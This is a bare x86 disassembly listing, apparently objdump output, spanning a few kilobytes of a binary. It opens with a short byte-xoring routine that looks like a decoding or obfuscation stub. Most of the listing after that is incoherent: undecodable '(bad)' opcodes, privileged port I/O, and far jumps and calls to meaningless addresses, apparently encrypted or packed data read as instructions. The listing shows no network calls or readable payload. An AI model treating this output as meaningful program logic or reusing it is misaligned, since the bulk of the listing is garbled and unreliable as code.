  423081:	(bad)  
  423082:	lea    eax,[edx+eax*1+0x3272db]
  423089:	movzx  edx,BYTE PTR [ebp-0x1]
  42308d:	xor    edx,eax
  42308f:	mov    BYTE PTR [ebp-0x1],dl
  423092:	mov    al,BYTE PTR [ebp-0x1]
  423095:	mov    edx,DWORD PTR [ebp-0x1c]
  423098:	mov    ebx,DWORD PTR [ebp-0xc]
  42309b:	xor    edx,esi
  42309d:	add    edx,edi
  42309f:	imul   edx,ebx
  4230a2:	mov    ebx,DWORD PTR [ebp-0x8]
  4230a5:	mov    BYTE PTR [edx+ebx*1],al
  4230a8:	mov    eax,DWORD PTR [ebp-0x1c]
  4230ab:	mov    edx,DWORD PTR [ebp-0xc]
  4230ae:	xor    eax,esi
  4230b0:	add    eax,edi
  4230b2:	imul   eax,edx
  4230b5:	mov    edx,DWORD PTR [ebp-0x8]
  4230b8:	mov    al,BYTE PTR [eax+edx*1]
  4230bb:	mov    BYTE PTR [ebp-0x1],al
  4230be:	mov    eax,DWORD PTR [ebp-0x1c]
  4230c1:	mov    edx,DWORD PTR [ebp-0xc]
  4230c4:	xor    eax,esi
  4230c6:	add    eax,edi
  4230c8:	imul   eax,edx
  4230cb:	mov    edx,DWORD PTR [ebp-0x3c]
  4230ce:	xor    edx,esi
  4230d0:	add    eax,edx
  4230d2:	jmp    0x423aec
  4230d7:	mov    ds:0x985c80eb,eax
  4230dc:	stos   DWORD PTR es:[edi],eax
  4230dd:	arpl   WORD PTR [ebx-0x7e],sp
  4230e0:	jg     0x4230ad
  4230e2:	xchg   BYTE PTR [edx-0x19],ch
  4230e5:	test   eax,0x6194b10d
  4230ea:	bound  esp,QWORD PTR [ebp+0x79]
  4230ed:	bound  esp,QWORD PTR [edx-0x74]
  4230f0:	bound  esi,QWORD PTR [ebx+0x25]
  4230f3:	jno    0x4230a0
  4230f5:	mov    esp,0xf33aa3cb
  4230fa:	push   esp
  4230fb:	and    ebx,DWORD PTR [ecx+edi*4-0xb561753]
  423102:	leave  
  423103:	jne    0x4230e2
  423105:	mov    ebx,0xcee75776
  42310a:	ret    0x719d
  42310d:	imul   DWORD PTR [ebp-0x4f]
  423110:	mov    esp,0xd5c0ea52
  423115:	ds test eax,0x3960ba36
  42311b:	(bad)  
  42311c:	out    dx,eax
  42311d:	sti    
  42311e:	xor    DWORD PTR [esi],edx
  423120:	sbb    DWORD PTR [edi-0x11836478],edx
  423126:	fisubr DWORD PTR [esi+ebx*2]
  423129:	stc    
  42312a:	jle    0x42311f
  42312c:	push   ebx
  42312d:	iret   
  42312e:	jmp    0x8077:0x830631a8
  423135:	lahf   
  423136:	(bad)  [eax+0x54]
  423139:	add    bh,ah
  42313b:	and    DWORD PTR [esi+ebp*4+0x27],esi
  42313f:	out    dx,eax
  423140:	retf   
  423141:	sub    eax,0x9ab975b5
  423146:	push   es
  423147:	pop    edx
  423148:	mov    al,ds:0xc1240c4
  42314d:	mov    WORD PTR [edi],es
  42314f:	sub    al,0x64
  423151:	(bad)
  423154:	sti    
  423155:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423156:	cmp    DWORD PTR [edi],eax
  423158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423159:	cmc    
  42315a:	std    
  42315b:	aad    0xe7
  42315d:	sar    BYTE PTR [edx+ebp*8],cl
  423160:	cmp    bl,dl
  423162:	out    0xad,al
  423164:	jp     0x423117
  423166:	mov    ds:0xa830060d,al
  42316b:	pusha  
  42316c:	xor    al,0x22
  42316e:	adc    BYTE PTR [ebx+0x7d],dh
  423171:	inc    ebp
  423172:	fwait
  423173:	cmp    eax,0xb9350692
  423178:	aam    0x1f
  42317a:	xchg   ecx,eax
  42317b:	and    bh,ch
  42317d:	inc    edi
  42317e:	gs mov esi,0xb4d02379
  423184:	nop
  423185:	inc    ecx
  423186:	int    0x1c
  423188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423189:	test   al,0x6e
  42318b:	cli    
  42318c:	or     ecx,ecx
  42318e:	jecxz  0x423199
  423190:	and    eax,0xe4e94234
  423195:	das    
  423196:	fld    TBYTE PTR [eax+eiz*1+0x7640c581]
  42319d:	bound  esi,QWORD PTR [edi+0x57]
  4231a0:	pusha  
  4231a1:	loop   0x4231a4
  4231a3:	inc    esp
  4231a4:	sub    al,0x24
  4231a6:	add    bl,ch
  4231a8:	jbe    0x423204
  4231aa:	mov    edx,0xe2265419
  4231af:	xlat   BYTE PTR ds:[ebx]
  4231b0:	aas    
  4231b1:	pop    esp
  4231b2:	jp     0x4231f4
  4231b4:	xchg   esi,eax
  4231b5:	inc    esi
  4231b6:	xchg   BYTE PTR [edx+0x20],bl
  4231b9:	scas   al,BYTE PTR es:[edi]
  4231ba:	mov    edi,0xb80f4402
  4231bf:	xchg   edi,eax
  4231c0:	lods   al,BYTE PTR ds:[esi]
  4231c1:	mov    ecx,0xb0daa59f
  4231c6:	mov    edi,ebx
  4231c8:	add    BYTE PTR [edi],0xb
  4231cb:	or     BYTE PTR [ebx-0x54],cl
  4231ce:	mov    bh,0x4b
  4231d0:	mov    ebp,0xff115745
  4231d5:	ret    
  4231d6:	jno    0x423212
  4231d8:	ret    0x8035
  4231db:	and    al,0xad
  4231dd:	cli    
  4231de:	out    0x9,al
  4231e0:	xor    ah,BYTE PTR [ebx]
  4231e2:	cli    
  4231e3:	pop    edi
  4231e4:	mov    ch,0xb2
  4231e6:	push   edx
  4231e7:	outs   dx,BYTE PTR ds:[esi]
  4231e8:	call   DWORD PTR [esi-0x4268adb3]
  4231ee:	fistp  DWORD PTR [ecx]
  4231f0:	and    ah,ah
  4231f2:	xor    DWORD PTR [edi-0x705bbd32],ebx
  4231f8:	sub    eax,0x3fa5c8cc
  4231fd:	xor    esi,DWORD PTR [ebp+0x722ace6f]
  423203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423204:	and    dl,al
  423206:	mov    dl,0xc9
  423208:	lods   al,BYTE PTR ds:[esi]
  423209:	adc    al,0xc9
  42320b:	inc    ecx
  42320c:	or     esp,DWORD PTR [ecx+0x2fe0acdc]
  423212:	ins    DWORD PTR es:[edi],dx
  423213:	shl    DWORD PTR [eax-0x21ca695b],1
  423219:	clc    
  42321a:	and    ecx,ebp
  42321c:	mov    eax,ds:0x8742bb59
  423221:	(bad)  
  423222:	fs mov bh,0x46
  423225:	pushf  
  423226:	out    0xa9,eax
  423228:	es popf 
  42322a:	pop    ecx
  42322b:	ins    BYTE PTR es:[edi],dx
  42322c:	jl     0x423251
  42322e:	es add al,0x18
  423231:	lods   al,BYTE PTR ds:[esi]
  423232:	and    BYTE PTR ds:0x438f4473,ah
  423238:	jl     0x42328d
  42323a:	mov    bl,0x3
  42323c:	adc    esi,DWORD PTR [edi+0x70]
  42323f:	test   BYTE PTR [edi+edx*1],bh
  423242:	stos   BYTE PTR es:[edi],al
  423243:	push   0xc112ec9d
  423248:	repz cmp BYTE PTR [ebx-0xf00a8d4],dl
  42324f:	xchg   BYTE PTR [edx-0x10],cl
  423252:	mov    eax,0xd7d4188b
  423257:	pop    ds
  423258:	mov    al,0x94
  42325a:	pop    ebx
  42325b:	fdivr  st(0),st
  42325d:	aaa    
  42325e:	jns    0x423239
  423260:	stos   BYTE PTR es:[edi],al
  423261:	retf   0x20cd
  423264:	sub    BYTE PTR [ecx],al
  423266:	cwde   
  423267:	cmp    ebp,esp
  423269:	ins    DWORD PTR es:[edi],dx
  42326a:	mov    eax,0x3deea146
  42326f:	xchg   esp,eax
  423270:	xchg   ebx,eax
  423271:	int    0x49
  423273:	pop    es
  423274:	fs out 0x1b,eax
  423277:	or     al,0xfd
  423279:	faddp  st(7),st
  42327b:	call   0x7aaf:0x83e5b06e
  423282:	jmp    0xd5e7:0x1ab4595b
  423289:	fiadd  WORD PTR [esp+ebx*2-0x21]
  42328d:	rcl    BYTE PTR [edx],1
  42328f:	daa    
  423290:	pop    ecx
  423291:	outs   dx,DWORD PTR ds:[esi]
  423292:	out    0x22,al
  423294:	shl    DWORD PTR [edi-0x12fd84d0],cl
  42329a:	pop    edi
  42329b:	xchg   ebp,eax
  42329c:	jmp    0x3346:0xca1501bf
  4232a3:	inc    edx
  4232a4:	push   0x7c
  4232a6:	pop    edx
  4232a7:	in     al,dx
  4232a8:	imul   ecx,DWORD PTR [edi+0x5e],0x727ed512
  4232af:	outs   dx,BYTE PTR ds:[esi]
  4232b0:	shl    BYTE PTR [edx],cl
  4232b2:	sbb    BYTE PTR [edi],0x58
  4232b5:	add    bh,BYTE PTR ds:0x8a00a03f
  4232bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232bc:	scas   al,BYTE PTR es:[edi]
  4232bd:	xchg   esi,eax
  4232be:	pusha  
  4232bf:	inc    ebp
  4232c0:	bound  edx,QWORD PTR es:[edi-0x33]
  4232c4:	(bad)  
  4232c5:	ficomp WORD PTR [eax+0x2ff3c912]
  4232cb:	cmovae edx,DWORD PTR [ebx]
  4232ce:	jecxz  0x423305
  4232d0:	jae    0x42334d
  4232d2:	inc    esp
  4232d3:	fsubr  QWORD PTR [edi]
  4232d5:	adc    bh,BYTE PTR [eax+0x47ddbd11]
  4232db:	adc    esi,edi
  4232dd:	mov    bh,0x55
  4232df:	mov    eax,ds:0xd1b2a078
  4232e4:	xchg   DWORD PTR ds:0xbf1d47ee,edx
  4232ea:	xor    al,0xbf
  4232ec:	inc    ebp
  4232ed:	into   
  4232ee:	inc    esp
  4232ef:	push   es
  4232f0:	mov    ds:0x860f440,eax
  4232f5:	sub    eax,esp
  4232f7:	or     eax,0x1112c6f
  4232fc:	jp     0x42335f
  4232fe:	cs shr dl,cl
  423301:	aaa    
  423302:	cmp    eax,0xad57b57
  423307:	xchg   ecx,eax
  423308:	scas   al,BYTE PTR es:[edi]
  423309:	mov    DWORD PTR [ebp+0x10914c73],esi
  42330f:	popf   
  423310:	adc    DWORD PTR [esp+esi*8-0x8],esp
  423314:	iret   
  423315:	imul   esi,DWORD PTR [eax],0x2c
  423318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423319:	cmp    edi,DWORD PTR [edi-0x6a]
  42331c:	pop    ecx
  42331d:	test   eax,0xf9ffa153
  423322:	and    DWORD PTR [edi],ebp
  423324:	lods   al,BYTE PTR ds:[esi]
  423325:	aaa    
  423326:	cli    
  423327:	push   eax
  423328:	fwait
  423329:	mov    WORD PTR [esi-0x74],gs
  42332c:	inc    ecx
  42332d:	xor    cl,al
  42332f:	scas   al,BYTE PTR es:[edi]
  423330:	mov    BYTE PTR [eax+0x4f],ch
  423333:	jb     0x4232ce
  423335:	out    dx,eax
  423336:	mul    DWORD PTR [edi-0x4ba0c90f]
  42333c:	(bad)  
  42333d:	lods   eax,DWORD PTR ds:[esi]
  42333e:	cdq    
  42333f:	ds push ax
  423342:	das    
  423343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423344:	mov    bl,0x33
  423346:	jle    0x4232f3
  423348:	hlt    
  423349:	pop    ecx
  42334a:	in     al,dx
  42334b:	pop    ebp
  42334c:	cmp    eax,eax
  42334e:	scas   al,BYTE PTR es:[edi]
  42334f:	cwde   
  423350:	jno    0x42336d
  423352:	pop    esi
  423353:	jnp    0x423381
  423355:	inc    eax
  423356:	push   0xf5a1361a
  42335b:	stos   DWORD PTR es:[edi],eax
  42335c:	cmp    BYTE PTR [edx+ebp*8+0x11],bh
  423360:	or     eax,0x1a2e4bcc
  423365:	xchg   BYTE PTR ds:0x1abf05be,dh
  42336b:	push   cs
  42336c:	in     al,dx
  42336d:	(bad)  
  42336e:	call   0xc5e72d52
  423373:	jb     0x4233c1
  423375:	and    ecx,DWORD PTR [ebx]
  423377:	or     esi,DWORD PTR [ecx+0x40]
  42337a:	imul   edx,DWORD PTR [ecx],0x9f3f3512
  423380:	arpl   WORD PTR [esp+esi*1+0x13],bx
  423384:	push   ebx
  423385:	pop    ecx
  423386:	push   eax
  423387:	or     bh,BYTE PTR [ebx+edi*2+0x18377a22]
  42338e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42338f:	mov    ds:0x39f17e25,eax
  423394:	add    DWORD PTR [ecx+0x66b62747],ecx
  42339a:	xchg   esp,eax
  42339b:	cli    
  42339c:	not    BYTE PTR [ecx+0x7f]
  42339f:	jnp    0x4233ea
  4233a1:	and    esp,DWORD PTR [edx+0x5b]
  4233a4:	pop    ss
  4233a5:	sbb    al,0xbf
  4233a7:	call   0x5d48c7ea
  4233ac:	pushf  
  4233ad:	(bad)  
  4233ae:	adc    edx,DWORD PTR [ecx]
  4233b0:	cdq    
  4233b1:	je     0x423399
  4233b3:	frstor [ebx-0x75]
  4233b6:	push   edx
  4233b7:	cmp    BYTE PTR [ebx+0x3d],al
  4233ba:	sub    DWORD PTR [edi+ebx*2-0x54],eax
  4233be:	in     eax,0x3f
  4233c0:	sar    DWORD PTR [ebx-0x5d],cl
  4233c3:	loop   0x423378
  4233c5:	xchg   dl,cl
  4233c7:	repz mov edx,0x91f7571a
  4233cd:	add    edx,DWORD PTR [ebx-0x2f]
  4233d0:	sbb    dh,BYTE PTR [edx-0x52]
  4233d3:	sub    DWORD PTR [esi],esi
  4233d5:	push   ds
  4233d6:	jecxz  0x423358
  4233d8:	ins    BYTE PTR es:[edi],dx
  4233d9:	ret    
  4233da:	ucomiss xmm0,DWORD PTR [edx+ebp*2]
  4233de:	xchg   esp,eax
  4233df:	inc    eax
  4233e0:	cld    
  4233e1:	push   es
  4233e2:	or     DWORD PTR [ecx],edx
  4233e4:	cmp    DWORD PTR [esi+ecx*4-0x46],edx
  4233e8:	test   BYTE PTR [edx],dl
  4233ea:	push   eax
  4233eb:	pop    esi
  4233ec:	xor    ebp,DWORD PTR ds:0xacee9f9
  4233f2:	(bad)  
  4233f3:	jge    0x423421
  4233f5:	sub    eax,0xa6cafcad
  4233fa:	outs   dx,BYTE PTR ds:[esi]
  4233fb:	sub    dh,dl
  4233fd:	push   ecx
  4233fe:	popf   
  4233ff:	add    ecx,edi
  423401:	xor    BYTE PTR [eax+0x69],dh
  423404:	jmp    0xe2e934ff
  423409:	es call 0xf28bf21e
  42340f:	sub    eax,0xc8af856a
  423414:	jne    0x4233bd
  423416:	cmp    al,cl
  423418:	test   ah,al
  42341a:	jae    0x423426
  42341c:	sti    
  42341d:	push   ss
  42341e:	scas   eax,DWORD PTR es:[edi]
  42341f:	fwait
  423420:	xor    eax,0x3e8e8d71
  423425:	cld    
  423426:	pop    ecx
  423427:	xchg   esp,eax
  423428:	mov    ds:0xbfe9488f,eax
  42342d:	into   
  42342e:	pop    edx
  42342f:	cmp    al,BYTE PTR [esi-0x5ed389a6]
  423435:	inc    esi
  423436:	jbe    0x4234b3
  423438:	fdiv   QWORD PTR [ebx+0x149c0886]
  42343e:	clc    
  42343f:	dec    ebp
  423440:	xchg   ecx,eax
  423441:	test   DWORD PTR fs:[ebx],esi
  423444:	dec    esp
  423445:	lods   al,BYTE PTR ds:[esi]
  423446:	pop    esp
  423447:	xor    DWORD PTR [eax],eax
  423449:	mov    esp,0x4254c83c
  42344e:	adc    edi,DWORD PTR [ecx+0x1ec5d5ef]
  423454:	(bad)
  423458:	dec    edx
  423459:	shl    DWORD PTR [ebx+0x5ebc29f8],cl
  42345f:	sub    eax,0x9eb5c3d6
  423464:	fisubr WORD PTR [ebx+0x27]
  423467:	mov    ah,0xaf
  423469:	xlat   BYTE PTR ds:[ebx]
  42346a:	cs xor eax,0xd481c0ac
  423470:	mov    al,ds:0x2ef8eb93
  423475:	add    BYTE PTR [ebp-0x3],ch
  423478:	fdiv   DWORD PTR [ebp+0x53189ad1]
  42347e:	or     al,0xa1
  423480:	scas   al,BYTE PTR es:[edi]
  423481:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423482:	mov    DWORD PTR [esi],ecx
  423484:	repnz mov ds:0x76faf4f2,al
  42348a:	sub    al,0x8
  42348c:	adc    ebp,esp
  42348e:	push   eax
  42348f:	inc    edi
  423490:	jno    0x42345e
  423492:	adc    BYTE PTR [eax+0x5a],bl
  423495:	xor    al,0x84
  423497:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423498:	xlat   BYTE PTR ds:[ebx]
  423499:	addr16 icebp 
  42349b:	fidiv  DWORD PTR [esi]
  42349d:	nop
  42349e:	nop
  42349f:	and    edx,edi
  4234a1:	leave  
  4234a2:	adc    bl,dl
  4234a4:	cmp    al,0x63
  4234a6:	adc    eax,0xff0ada87
  4234ab:	test   eax,0x40abed11
  4234b0:	daa    
  4234b1:	rol    dl,0xe3
  4234b4:	dec    esp
  4234b5:	dec    esi
  4234b6:	sub    DWORD PTR [edx-0x25],edx
  4234b9:	or     ebp,DWORD PTR [ecx+0x15]
  4234bc:	sbb    eax,0x49a1dcaf
  4234c1:	add    edi,DWORD PTR [edi-0x6]
  4234c4:	aas    
  4234c5:	mov    esi,0x34896f5a
  4234ca:	or     DWORD PTR [edx+ebx*8+0x3b],esi
  4234ce:	bound  ebx,QWORD PTR [edx+0x157e309c]
  4234d4:	or     al,0x9f
  4234d6:	pop    edi
  4234d7:	in     al,0xf
  4234d9:	pop    edi
  4234da:	int3   
  4234db:	mov    eax,esp
  4234dd:	(bad)  
  4234de:	jmp    0xd2f6:0xe991329f
  4234e5:	ret    0x6bca
  4234e8:	loop   0x423554
  4234ea:	ins    DWORD PTR es:[edi],dx
  4234eb:	int3   
  4234ec:	rcl    DWORD PTR gs:[edi],1
  4234ef:	loope  0x42351f
  4234f1:	push   ss
  4234f2:	mov    fs,WORD PTR [ebx+eiz*2+0x1c84e77e]
  4234f9:	out    dx,al
  4234fa:	js     0x42355c
  4234fc:	adc    al,0xda
  4234fe:	(bad)  
  4234ff:	xlat   BYTE PTR ds:[ebx]
  423500:	pushf  
  423501:	push   0xfffffff8
  423503:	sub    eax,0xe1e7b71a
  423508:	push   0x2f609175
  42350d:	mov    al,ds:0x9931d8a2
  423512:	fsub   DWORD PTR [eax+0x60]
  423515:	inc    ebx
  423516:	mov    bl,0x73
  423518:	sub    eax,0xc2f1b2ce
  42351d:	stc    
  42351e:	jmp    0x2b0a:0x9c0967dd
  423525:	jo     0x4234de
  423527:	xchg   DWORD PTR [ebx+0x13],ecx
  42352a:	call   0x1267:0x78c641c4
  423531:	inc    edx
  423532:	imul   eax,DWORD PTR ds:0xd63e5c66,0x63a2305
  42353c:	jbe    0x4234d9
  42353e:	dec    esi
  42353f:	cs mov cl,0x44
  423542:	mov    esp,0x4581881a
  423547:	out    dx,al
  423548:	push   esi
  423549:	clc    
  42354a:	sbb    al,0xaf
  42354c:	xchg   edx,eax
  42354d:	xlat   BYTE PTR ds:[ebx]
  42354e:	scas   al,BYTE PTR es:[edi]
  42354f:	aad    0x72
  423551:	xor    DWORD PTR [ebx+0x53c628a8],esp
  423557:	mov    ds:0x66c6357e,eax
  42355c:	mov    ds:0x8e8ac9b5,al
  423561:	push   ss
  423562:	sahf   
  423563:	sbb    cl,0x3e
  423566:	lock pusha 
  423568:	test   ch,dl
  42356a:	push   ss
  42356b:	dec    esp
  42356c:	hlt    
  42356d:	push   cs
  42356e:	in     al,0xff
  423570:	push   ebp
  423571:	call   0x25b7:0x338a9dd7
  423578:	mov    ecx,0x35c119dd
  42357d:	into   
  42357e:	pop    edi
  42357f:	or     eax,0x3347a656
  423584:	jg     0x4235e3
  423586:	and    eax,0x8ce61a0a
  42358b:	mov    bl,0xf6
  42358d:	loope  0x42352e
  42358f:	outs   dx,DWORD PTR ds:[esi]
  423590:	cld    
  423591:	and    al,BYTE PTR [esi-0x78bb54fd]
  423597:	and    dl,BYTE PTR [ecx+0x64]
  42359a:	xchg   ebx,eax
  42359b:	retf   0x3341
  42359e:	cmp    edi,DWORD PTR [edi+0x7d45246c]
  4235a4:	sub    cl,BYTE PTR [ebx]
  4235a6:	pop    ss
  4235a7:	mov    al,ds:0x1e5d2368
  4235ac:	xor    cl,dh
  4235ae:	mov    ecx,0x4294c681
  4235b3:	pop    eax
  4235b4:	lods   al,BYTE PTR ds:[esi]
  4235b5:	rcr    DWORD PTR [esi],0xdf
  4235b8:	jle    0x4235b4
  4235ba:	sub    al,0x99
  4235bc:	mov    esp,0x5aa834dd
  4235c1:	jns    0x42359e
  4235c3:	jge    0x423617
  4235c5:	sub    al,0x2c
  4235c7:	and    cl,BYTE PTR [ebp+0x636cb7a2]
  4235cd:	scas   al,BYTE PTR es:[edi]
  4235ce:	mov    ?,ebp
  4235d0:	es pop eax
  4235d2:	mov    ecx,0x485892df
  4235d7:	paddsw mm0,QWORD PTR [edx]
  4235da:	mov    WORD PTR [esp+ecx*1-0x6a6aa7f8],gs
  4235e1:	pusha  
  4235e2:	adc    eax,0xed59d3f1
  4235e7:	scas   eax,DWORD PTR es:[edi]
  4235e8:	pop    ds
  4235e9:	neg    BYTE PTR [ebp-0x6]
  4235ec:	sub    ebx,DWORD PTR [ecx+esi*1]
  4235ef:	out    0x81,eax
  4235f1:	ret    0xf655
  4235f4:	mov    ebx,?
  4235f6:	add    DWORD PTR [esi-0x8574491],ebx
  4235fc:	and    ah,BYTE PTR [esi]
  4235fe:	outs   dx,DWORD PTR ds:[esi]
  4235ff:	mov    ch,0xf
  423601:	or     BYTE PTR ds:0xe7b983e7,dl
  423607:	push   ss
  423608:	inc    ecx
  423609:	mov    ds:0x17bd7aca,al
  42360e:	in     eax,0x32
  423610:	je     0x4235f1
  423612:	stos   BYTE PTR es:[edi],al
  423613:	lods   al,BYTE PTR ds:[esi]
  423614:	mov    ebp,0x12b1f1b7
  423619:	xchg   BYTE PTR [edi-0x2089ee4f],dh
  42361f:	push   0xffffffc0
  423621:	data16 int 0x7
  423624:	repz rol ebp,1
  423627:	lea    eax,[ebx-0x67]
  42362a:	pushf  
  42362b:	adc    BYTE PTR [ebx-0x70],dh
  42362e:	dec    esi
  42362f:	call   FWORD PTR [esp+ebp*1]
  423632:	out    dx,al
  423633:	xchg   DWORD PTR [edx],ecx
  423635:	(bad)  
  423637:	mov    esp,edi
  423639:	outs   dx,DWORD PTR ds:[esi]
  42363a:	sbb    eax,0x8c1eeb8d
  42363f:	pop    edx
  423640:	sbb    eax,0x91b8682f
  423645:	push   ebp
  423646:	and    al,0x10
  423648:	jg     0x423605
  42364a:	xor    eax,0x82412304
  42364f:	cld    
  423650:	sbb    DWORD PTR [ecx*1-0x7884c2d0],esp
  423657:	jle    0x423695
  423659:	xor    al,0xdc
  42365b:	inc    di
  42365d:	(bad)  
  42365e:	push   ss
  42365f:	ins    DWORD PTR es:[edi],dx
  423660:	mov    ebx,0x5c6b9735
  423665:	xor    eax,0xedf563c4
  42366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42366b:	call   0x8ccd:0xa82059b1
  423672:	and    DWORD PTR [eax],ebp
  423674:	pop    edx
  423675:	xor    al,0xd5
  423677:	inc    edi
  423678:	stos   DWORD PTR es:[edi],eax
  423679:	repz xor DWORD PTR [edi],esi
  42367c:	dec    ecx
  42367d:	es mov eax,0x8050d574
  423683:	cmp    DWORD PTR [eax+eiz*2+0x51c97b08],edx
  42368a:	mov    ch,0x75
  42368c:	xlat   BYTE PTR ds:[ebx]
  42368d:	inc    eax
  42368e:	outs   dx,BYTE PTR ds:[esi]
  42368f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423690:	aad    0x49
  423692:	leave  
  423693:	xchg   esp,eax
  423694:	ds mov ebx,0x6295d7f7
  42369a:	retf   
  42369b:	mov    edi,0x805f974f
  4236a0:	ret    0x3dee
  4236a3:	test   edi,ecx
  4236a5:	push   cs
  4236a6:	sbb    BYTE PTR [esi],dh
  4236a8:	pop    esp
  4236a9:	imul   cl
  4236ab:	sbb    al,0x1e
  4236ad:	sbb    BYTE PTR [ebx],bh
  4236af:	xor    BYTE PTR [edi+edx*1],cl
  4236b2:	xchg   edi,eax
  4236b3:	cmp    BYTE PTR [ebx+0x5f],bh
  4236b6:	push   edi
  4236b7:	in     eax,0xef
  4236b9:	stos   BYTE PTR es:[edi],al
  4236ba:	push   ebp
  4236bb:	pusha  
  4236bc:	jnp    0x4236ae
  4236be:	mov    ?,eax
  4236c0:	stc    
  4236c1:	inc    esp
  4236c2:	ins    BYTE PTR es:[edi],dx
  4236c3:	mov    ebp,ds
  4236c5:	les    ebp,FWORD PTR [edx]
  4236c7:	lock rcl BYTE PTR [ebx-0x32],0xbf
  4236cc:	xchg   esp,eax
  4236cd:	sub    DWORD PTR [edi+0x7d],ebp
  4236d0:	or     bl,bh
  4236d2:	and    ebp,DWORD PTR [ecx+edx*1]
  4236d5:	pusha  
  4236d6:	into   
  4236d7:	pop    edi
  4236d8:	jmp    0xf0764ab2
  4236dd:	cmp    DWORD PTR [ebp+0x40],ebp
  4236e0:	sbb    BYTE PTR [esi-0x4dc60152],0x93
  4236e7:	frstpm(287 only) 
  4236e9:	dec    ecx
  4236ea:	pop    ecx
  4236eb:	or     BYTE PTR [ecx+0x56eae040],0x6a
  4236f2:	retf   
  4236f3:	in     al,0x59
  4236f5:	dec    DWORD PTR [ecx-0x5c]
  4236f8:	dec    eax
  4236f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236fa:	pop    edx
  4236fb:	icebp  
  4236fc:	shl    DWORD PTR [esi],0x22
  4236ff:	aas    
  423700:	std    
  423701:	pop    edx
  423702:	in     eax,0x46
  423704:	mov    ecx,0x5208b62
  423709:	push   ebp
  42370a:	test   DWORD PTR [edi-0x55],ebx
  42370d:	ret    0xe054
  423710:	sbb    DWORD PTR [ebx+0x5e],ebp
  423713:	sub    esi,DWORD PTR [edi-0x6aa016f8]
  423719:	bound  ecx,QWORD PTR [ebp-0x3f6e6d83]
  42371f:	(bad)  
  423720:	pop    ss
  423721:	leave  
  423722:	mov    esp,esp
  423724:	cmp    esp,edi
  423726:	jbe    0x4236b1
  423728:	das    
  423729:	jae    0x4236d5
  42372b:	mov    dl,0x8
  42372d:	adc    ebp,esp
  42372f:	in     eax,dx
  423730:	xchg   ecx,eax
  423731:	xor    edi,DWORD PTR [ebx+0x23ea70c1]
  423737:	pusha  
  423738:	dec    esp
  423739:	push   ebx
  42373a:	out    0xc,al
  42373c:	adc    eax,DWORD PTR [ebx+0x52]
  42373f:	adc    DWORD PTR [eax+0xba7bb8],esi
  423745:	retf   
  423746:	mov    ebx,0x8d114a7e
  42374b:	mov    al,ds:0x18caf9d9
  423750:	in     eax,dx
  423751:	mov    ds:0xa5b4787,eax
  423756:	icebp  
  423757:	lock les esp,FWORD PTR [ecx]
  42375a:	push   es
  42375b:	xor    BYTE PTR [ebx],ch
  42375d:	dec    ebx
  42375e:	fstp   DWORD PTR [ebp-0x1e7aa217]
  423764:	adc    eax,0xe7ece870
  423769:	stc    
  42376a:	and    BYTE PTR [eax+eiz*1+0x352681f1],al
  423771:	arpl   WORD PTR [edx-0x59ddc3e5],sp
  423777:	rcr    BYTE PTR [eax+0x26],0xeb
  42377b:	(bad)  
  42377c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42377d:	xor    BYTE PTR [ebp+eax*2+0x6b],ch
  423781:	aas    
  423782:	mov    WORD PTR [esi],cs
  423784:	dec    edi
  423785:	fmul   st,st(0)
  423787:	xor    BYTE PTR [esp+ebp*1-0x3f119b5a],bh
  42378e:	dec    ecx
  42378f:	and    al,0x9a
  423791:	imul   edi,edi,0x21
  423794:	sbb    eax,edx
  423796:	aam    0xf7
  423798:	(bad)  
  423799:	jge    0x42375c
  42379b:	jnp    0x4237e3
  42379d:	xchg   esi,eax
  42379e:	mov    esp,0x43827837
  4237a3:	xchg   edi,eax
  4237a4:	scas   eax,DWORD PTR es:[edi]
  4237a5:	dec    eax
  4237a6:	popf   
  4237a7:	lahf   
  4237a8:	stc    
  4237a9:	repnz push ecx
  4237ab:	or     ah,BYTE PTR [esi+0x1]
  4237ae:	test   BYTE PTR [ecx],dl
  4237b0:	cmp    DWORD PTR [eax-0x42e320d0],0x54
  4237b7:	xor    dh,dh
  4237b9:	shl    BYTE PTR [ebx],1
  4237bb:	and    DWORD PTR [esi-0x57],eax
  4237be:	jbe    0x423740
  4237c0:	sbb    al,0xab
  4237c2:	call   0xea83b068
  4237c7:	mov    edi,ecx
  4237c9:	and    DWORD PTR [eax+0x31],eax
  4237cc:	popf   
  4237cd:	fst    QWORD PTR [eax+0x16afa73a]
  4237d3:	pop    ds
  4237d4:	into   
  4237d5:	or     BYTE PTR [edi],bh
  4237d7:	add    al,0xc8
  4237d9:	adc    al,BYTE PTR [ebx-0x4]
  4237dc:	mov    ds:0x8797da93,al
  4237e1:	xchg   esi,ebx
  4237e3:	mov    esp,0x8d1bd84c
  4237e8:	jae    0x423815
  4237ea:	push   es
  4237eb:	mov    di,0xeb2e
  4237ef:	dec    eax
  4237f0:	test   al,0x64
  4237f2:	xor    esp,edi
  4237f4:	mov    edi,0x6dc5e470
  4237f9:	das    
  4237fa:	mov    bl,0x5f
  4237fc:	mov    esp,0xca3e4e3f
  423801:	lods   al,BYTE PTR ds:[esi]
  423802:	outs   dx,BYTE PTR ds:[esi]
  423803:	cmp    al,0xe3
  423805:	scas   al,BYTE PTR es:[edi]
  423806:	imul   esi,DWORD PTR [edi-0x64],0x9cc765d0
  42380d:	add    eax,0xb96194d1
  423812:	or     al,0xfd
  423814:	pop    ecx
  423815:	repnz fcomp DWORD PTR [ebp+eiz*4+0x7e]
  42381a:	aam    0xf2
  42381c:	inc    ebp
  42381d:	repz hlt 
  42381f:	xor    al,0x88
  423821:	rol    DWORD PTR [edi],1
  423823:	jnp    0x4237f2
  423825:	mov    bl,0xee
  423827:	push   cs
  423828:	and    al,0x5a
